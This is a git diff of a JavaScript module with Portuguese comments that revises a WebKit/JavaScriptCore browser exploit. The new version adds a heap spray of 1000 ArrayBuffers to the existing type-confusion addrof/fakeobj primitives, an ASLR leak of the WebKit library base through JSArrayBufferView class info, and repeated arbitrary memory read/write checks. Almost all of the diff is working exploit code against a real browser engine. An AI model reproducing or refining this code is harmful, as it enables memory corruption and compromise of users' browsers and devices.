@@ -1,8 +1,9 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v108 - R60 Final com Vazamento REAL e LIMPO de ASLR WebKit - SOLUÇÃO DE PAR DE ARRAYS)
+// js/script3/testArrayBufferVictimCrash.mjs (v109 - R60 Final com Vazamento REAL e LIMPO de ASLR WebKit - ALOCAÇÃO ISOLADA AGRESSIVA)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA PARA ROBUSTEZ MÁXIMA E VAZAMENTO REAL E LIMPO DE ASLR:
 // - **RESOLVIDA COLISÃO DE ENDEREÇOS na alocação do objeto de vazamento ASLR
-//    através do uso de um par de arrays de type confusion dedicado.**
+//    através de um spray local agressivo para isolamento da al alocação.**
+// - Uso de par de arrays de type confusion dedicado para vazamento.
 // - Priorização do Vazamento de ASLR ANTES de corrupções arbitrárias no heap.
 // - Implementação funcional de vazamento da base da biblioteca WebKit.
 // - Removidas todas as simulações da fase de vazamento.
@@ -26,7 +27,7 @@ import {
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v108_R60_REAL_ASLR_LEAK_DUAL_TC";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v109_R60_REAL_ASLR_LEAK_AGRESSIVE_ISOLATION";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -52,7 +53,7 @@ let global_spray_objects = [];
 
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação Final com Verificação e Robustez Máxima (Vazamento REAL e LIMPO de ASLR - Colisão Resolvida) ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação Final com Verificação e Robustez Máxima (Vazamento REAL e LIMPO de ASLR - Colisão Resolvida Agressivamente) ---`, "test");
 
     let final_result = { success: false, message: "A verificação funcional de L/E falhou.", details: {} };
     const startTime = performance.now();
@@ -66,8 +67,9 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     // Primitivas DEDICADAS para o vazamento de ASLR
     let addrof_leak = null;
     let fakeobj_leak = null;
-    // Não precisamos de arb_read/arb_write dedicados para o leak,
-    // as primitivas principais serão usadas após o leak ASLR.
+    
+    // Variável para o spray de preenchimento local
+    let local_fill_spray = [];
 
     try {
         logS3("Limpeza inicial do ambiente OOB para garantir estado limpo...", "info");
@@ -135,7 +137,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         logS3("Primitivas PRINCIPAIS 'addrof' e 'fakeobj' operacionais e robustas.", "good");
 
         // === Par de Arrays de Type Confusion DEDICADO para VAZAMENTO ASLR ===
-        // Criado para evitar colisões com o par principal durante o vazamento real.
         const confused_array_leak = [13.37];
         const victim_array_leak = [{ a: 1 }];
 
@@ -229,17 +230,27 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         const leakPrepStartTime = performance.now();
         let webkit_base_address = null;
 
-        // Não precisa mais de spray de arremesso aqui, nem de re-inicialização do OOB,
-        // pois estamos usando um par de arrays de type confusion DEDICADO para o leak,
-        // isolando-o do heap principal de corrupções.
+        // ** ESTRATÉGIA AGRESSIVA: Preencher slots de memória com objetos maiores **
+        // Isso é para "empurrar" as alocações de objetos pequenos para longe dos
+        // slots problemáticos que o JSC insiste em reutilizar para os arrays de TC.
+        logS3("Iniciando spray de preenchimento local (objetos maiores) para afastar a alocação do objeto de vazamento ASLR...", "info");
+        // Criar uma quantidade grande de objetos de tamanho diferente dos arrays e Uint8Array(1)
+        // O número exato e o tamanho podem precisar de ajuste por tentativa e erro.
+        // Aqui, 1000 ArrayBuffers de 64 bytes.
+        local_fill_spray = [];
+        for (let i = 0; i < 1000; i++) {
+            local_fill_spray.push(new ArrayBuffer(64 + (i % 16))); // Tamanhos variados
+        }
+        logS3(`Criados ${local_fill_spray.length} objetos de preenchimento local para manipular a alocação.`, "debug");
+        await PAUSE_S3(50); // Pequena pausa para o JS processar alocações.
 
-        logS3("Iniciando vazamento REAL da base ASLR da WebKit através de JSC::JSArrayBufferView::s_info (usando par dedicado)...", "info");
+        logS3("Iniciando vazamento REAL da base ASLR da WebKit através de JSC::JSArrayBufferView::s_info (usando par dedicado e alocação isolada)...", "info");
 
         // 1. Criar um Uint8Array para ter um objeto do tipo ArrayBufferView
         // Este objeto agora é alocado no contexto do par de arrays de vazamento,
-        // não colidindo com o par de arrays principal.
-        const leak_candidate_u8a = new Uint8Array(1);
-        logS3(`Objeto Uint8Array criado para vazamento de ClassInfo (usando par de TC dedicado): ${leak_candidate_u8a}`, "debug");
+        // E o spray de preenchimento local deve ajudar a alocá-lo longe do par principal.
+        const leak_candidate_u8a = new Uint8Array(16); // Usando um tamanho maior para o Uint8Array também
+        logS3(`Objeto Uint8Array (tamanho 16) criado para vazamento de ClassInfo (usando par de TC dedicado e spray de preenchimento): ${leak_candidate_u8a}`, "debug");
 
         // 2. Obter o endereço de memória do objeto leak_candidate (Uint8Array)
         // Usa a addrof DEDICADA para o leak
@@ -248,7 +259,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
 
         // 3. Ler o ponteiro para a Structure* do Uint8Array
         // Usar arb_read_main, pois ela é universal (m_vector do OOB DV é manipulado).
-        // Não é fakeobj_leak, é arb_read_main!
         const structure_ptr = arb_read_main(leak_candidate_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET));
         if (!isAdvancedInt64Object(structure_ptr) || structure_ptr.equals(AdvancedInt64.Zero)) {
             throw new Error(`[REAL LEAK] Falha ao ler ponteiro da Structure. Endereço inválido: ${structure_ptr.toString(true)}`);
@@ -256,7 +266,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         logS3(`[REAL LEAK] Ponteiro para a Structure* do Uint8Array: ${structure_ptr.toString(true)}`, "leak");
 
         // 4. Ler o ponteiro para a ClassInfo* (esperado JSC::JSArrayBufferView::s_info) da Structure
-        // Usa arb_read_main
         const class_info_ptr = arb_read_main(structure_ptr.add(JSC_OFFSETS.Structure.CLASS_INFO_OFFSET));
         if (!isAdvancedInt64Object(class_info_ptr) || class_info_ptr.equals(AdvancedInt64.Zero)) {
             throw new Error(`[REAL LEAK] Falha ao ler ponteiro da ClassInfo. Endereço inválido: ${class_info_ptr.toString(true)}`);
@@ -293,18 +302,18 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         const test_obj_post_leak = global_spray_objects[5001]; // Usando outro objeto do spray
         logS3(`Objeto de teste escolhido do spray (índice 5001) para teste pós-vazamento: ${JSON.stringify(test_obj_post_leak)}`, "info");
 
-        const test_obj_addr_post_leak = addrof_main(test_obj_post_leak); // Usa addrof PRINCIPAL
+        const test_obj_addr_post_leak = addrof_main(test_obj_post_leak);
         logS3(`Endereço do objeto de teste pós-vazamento: ${test_obj_addr_post_leak.toString(true)}`, "info");
 
         const value_to_write_post_leak = new AdvancedInt64(0xDEADC0DE, 0xFEEDBEEF);
         const prop_a_addr_post_leak = test_obj_addr_post_leak.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET);
         
         logS3(`Executando arb_write_main (Pós-Vazamento): escrevendo ${value_to_write_post_leak.toString(true)} no endereço ${prop_a_addr_post_leak.toString(true)}...`, "info");
-        arb_write_main(prop_a_addr_post_leak, value_to_write_post_leak); // Usa arb_write PRINCIPAL
+        arb_write_main(prop_a_addr_post_leak, value_to_write_post_leak);
         logS3(`Escrita do valor de teste (Pós-Vazamento) concluída.`, "info");
 
         logS3(`Executando arb_read_main (Pós-Vazamento): lendo do endereço ${prop_a_addr_post_leak.toString(true)}...`, "info");
-        const value_read_post_leak = arb_read_main(prop_a_addr_post_leak); // Usa arb_read PRINCIPAL
+        const value_read_post_leak = arb_read_main(prop_a_addr_post_leak);
         logS3(`Leitura do valor de teste (Pós-Vazamento) concluída.`, "info");
         logS3(`>>>>> VALOR LIDO DE VOLTA (Pós-Vazamento): ${value_read_post_leak.toString(true)} <<<<<`, "leak");
 
@@ -318,8 +327,8 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         for (let i = 0; i < numResistanceTests; i++) {
             const test_value = new AdvancedInt64(0xCCCC0000 + i, 0xDDDD0000 + i);
             try {
-                arb_write_main(prop_a_addr_post_leak, test_value); // Usa arb_write PRINCIPAL
-                const read_back_value = arb_read_main(prop_a_addr_post_leak); // Usa arb_read PRINCIPAL
+                arb_write_main(prop_a_addr_post_leak, test_value);
+                const read_back_value = arb_read_main(prop_a_addr_post_leak);
 
                 if (read_back_value.equals(test_value)) {
                     resistanceSuccessCount_post_leak++;
@@ -359,6 +368,8 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         logS3(`Iniciando limpeza final do ambiente e do spray de objetos...`, "info");
         clearOOBEnvironment({ force_clear_even_if_not_setup: true });
         global_spray_objects = [];
+        // Limpar o spray de preenchimento local também
+        local_fill_spray = [];
         logS3(`Limpeza final concluída. Tempo total do teste: ${(performance.now() - startTime).toFixed(2)}ms`, "info");
     }
 
